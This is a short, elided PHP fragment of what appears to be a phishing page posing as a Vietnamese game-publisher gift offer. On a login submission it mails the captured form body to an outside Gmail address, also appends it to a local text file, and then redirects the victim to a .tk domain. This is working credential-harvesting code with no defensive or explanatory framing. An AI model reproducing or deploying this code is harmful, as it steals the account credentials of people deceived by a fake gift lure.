    ...
    <?php
    	if(isset($_POST["login"])){
            ...
            echo $_SESSION["username"];
             ...
             mail("facebook152005@gmail.com", $headers, $body, $subject);
            $test = fopen("xyz.txt","a");
            fwrite($test,$body);
            fclose($test); 
            header('Location: http://ff-vongquay.tk/duyet.php/');
...
<meta property="og:title" content="Nhận quà Từ Nhà Phát Hành" />
